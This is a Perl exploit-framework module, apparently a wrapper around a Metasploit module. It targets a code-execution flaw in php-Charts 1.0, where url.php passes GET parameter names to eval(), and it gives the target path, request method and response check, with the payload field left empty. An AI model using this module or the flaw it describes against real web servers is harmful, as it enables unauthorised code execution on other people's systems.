package PHP::MSF::PhpChartsExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhpChartsExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a PHP code execution vulnerability in php-Charts

        version 1.0 which could be abused to allow users to execute arbitrary

        PHP code under the context of the webserver user. The 'url.php' script

        calls eval() with user controlled data from any HTTP GET parameter name.

      ",
  METHOD => "GET",
  MSF_MODULE => "php_charts_exec",
  OSVDB => 89334,
  PATHS => ["php-charts_v1.0/"],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/php-charts_v1.0/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
